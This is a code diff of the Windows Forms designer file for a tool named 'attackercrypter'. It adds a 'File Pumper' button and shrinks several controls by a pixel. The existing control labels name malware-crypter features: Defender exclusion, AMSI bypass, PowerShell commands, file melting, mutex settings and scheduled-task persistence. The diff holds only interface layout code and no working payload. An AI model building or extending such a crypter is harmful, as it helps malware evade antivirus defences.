@@ -106,6 +106,7 @@ namespace attackercrypter
             this.label16 = new System.Windows.Forms.Label();
             this.button8 = new System.Windows.Forms.Button();
             this.melt = new System.Windows.Forms.CheckBox();
+            this.pump = new System.Windows.Forms.Button();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSc)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.numericUpDownSleep)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pictureIcon)).BeginInit();
@@ -172,7 +173,7 @@ namespace attackercrypter
             this.exdf.ForeColor = System.Drawing.Color.Transparent;
             this.exdf.Location = new System.Drawing.Point(33, 349);
             this.exdf.Name = "exdf";
-            this.exdf.Size = new System.Drawing.Size(154, 20);
+            this.exdf.Size = new System.Drawing.Size(153, 20);
             this.exdf.TabIndex = 7;
             this.exdf.Text = "Exclude Deffender";
             this.exdf.UseVisualStyleBackColor = false;
@@ -295,7 +296,7 @@ namespace attackercrypter
             this.label3.ForeColor = System.Drawing.Color.Transparent;
             this.label3.Location = new System.Drawing.Point(541, 170);
             this.label3.Name = "label3";
-            this.label3.Size = new System.Drawing.Size(136, 16);
+            this.label3.Size = new System.Drawing.Size(135, 16);
             this.label3.TabIndex = 32;
             this.label3.Text = "ScTask Run Every";
             this.label3.Click += new System.EventHandler(this.label3_Click);
@@ -308,7 +309,7 @@ namespace attackercrypter
             this.label4.ForeColor = System.Drawing.Color.Transparent;
             this.label4.Location = new System.Drawing.Point(819, 174);
             this.label4.Name = "label4";
-            this.label4.Size = new System.Drawing.Size(61, 16);
+            this.label4.Size = new System.Drawing.Size(60, 16);
             this.label4.TabIndex = 33;
             this.label4.Text = "Minutes";
             this.label4.Click += new System.EventHandler(this.label4_Click);
@@ -393,7 +394,7 @@ namespace attackercrypter
             this.Sleeptime.ForeColor = System.Drawing.Color.Transparent;
             this.Sleeptime.Location = new System.Drawing.Point(197, 349);
             this.Sleeptime.Name = "Sleeptime";
-            this.Sleeptime.Size = new System.Drawing.Size(60, 20);
+            this.Sleeptime.Size = new System.Drawing.Size(59, 20);
             this.Sleeptime.TabIndex = 41;
             this.Sleeptime.Text = "Sleep";
             this.Sleeptime.UseVisualStyleBackColor = false;
@@ -406,7 +407,7 @@ namespace attackercrypter
             this.label9.ForeColor = System.Drawing.Color.Transparent;
             this.label9.Location = new System.Drawing.Point(358, 351);
             this.label9.Name = "label9";
-            this.label9.Size = new System.Drawing.Size(59, 16);
+            this.label9.Size = new System.Drawing.Size(58, 16);
             this.label9.TabIndex = 42;
             this.label9.Text = "Seconds";
             // 
@@ -731,7 +732,7 @@ namespace attackercrypter
             this.powershell.ForeColor = System.Drawing.Color.Lime;
             this.powershell.Location = new System.Drawing.Point(33, 395);
             this.powershell.Name = "powershell";
-            this.powershell.Size = new System.Drawing.Size(176, 20);
+            this.powershell.Size = new System.Drawing.Size(175, 20);
             this.powershell.TabIndex = 79;
             this.powershell.Text = "Powershell Command";
             this.powershell.UseVisualStyleBackColor = false;
@@ -745,7 +746,7 @@ namespace attackercrypter
             this.Amsi.ForeColor = System.Drawing.Color.Transparent;
             this.Amsi.Location = new System.Drawing.Point(33, 372);
             this.Amsi.Name = "Amsi";
-            this.Amsi.Size = new System.Drawing.Size(117, 20);
+            this.Amsi.Size = new System.Drawing.Size(116, 20);
             this.Amsi.TabIndex = 80;
             this.Amsi.Text = "Bypass Amsi";
             this.Amsi.UseVisualStyleBackColor = false;
@@ -925,7 +926,7 @@ namespace attackercrypter
             this.label15.ForeColor = System.Drawing.Color.White;
             this.label15.Location = new System.Drawing.Point(156, 376);
             this.label15.Name = "label15";
-            this.label15.Size = new System.Drawing.Size(107, 16);
+            this.label15.Size = new System.Drawing.Size(106, 16);
             this.label15.TabIndex = 89;
             this.label15.Text = "Mutex-Setting";
             this.label15.Click += new System.EventHandler(this.label15_Click);
@@ -998,10 +999,28 @@ namespace attackercrypter
             this.melt.ForeColor = System.Drawing.Color.Transparent;
             this.melt.Location = new System.Drawing.Point(423, 350);
             this.melt.Name = "melt";
-            this.melt.Size = new System.Drawing.Size(86, 20);
+            this.melt.Size = new System.Drawing.Size(85, 20);
             this.melt.TabIndex = 94;
             this.melt.Text = "Melt File";
             this.melt.UseVisualStyleBackColor = false;
+            // 
+            // pump
+            // 
+            this.pump.BackColor = System.Drawing.Color.Red;
+            this.pump.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.pump.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.pump.FlatAppearance.BorderSize = 0;
+            this.pump.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.pump.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.pump.ForeColor = System.Drawing.Color.White;
+            this.pump.Location = new System.Drawing.Point(983, 177);
+            this.pump.Name = "pump";
+            this.pump.Size = new System.Drawing.Size(125, 57);
+            this.pump.TabIndex = 95;
+            this.pump.Text = "File Pumper";
+            this.pump.UseCompatibleTextRendering = true;
+            this.pump.UseVisualStyleBackColor = false;
+            this.pump.Click += new System.EventHandler(this.pump_Click);
             // 
             // Form1
             // 
@@ -1010,6 +1029,7 @@ namespace attackercrypter
             this.BackColor = System.Drawing.Color.White;
             this.BackgroundImage = global::attackercrypter.Properties.Resources.kali_linux_3;
             this.ClientSize = new System.Drawing.Size(1473, 559);
+            this.Controls.Add(this.pump);
             this.Controls.Add(this.melt);
             this.Controls.Add(this.button8);
             this.Controls.Add(this.label16);
@@ -1174,6 +1194,7 @@ namespace attackercrypter
         private System.Windows.Forms.Label label16;
         private System.Windows.Forms.Button button8;
         private System.Windows.Forms.CheckBox melt;
+        private System.Windows.Forms.Button pump;
     }
 }
 
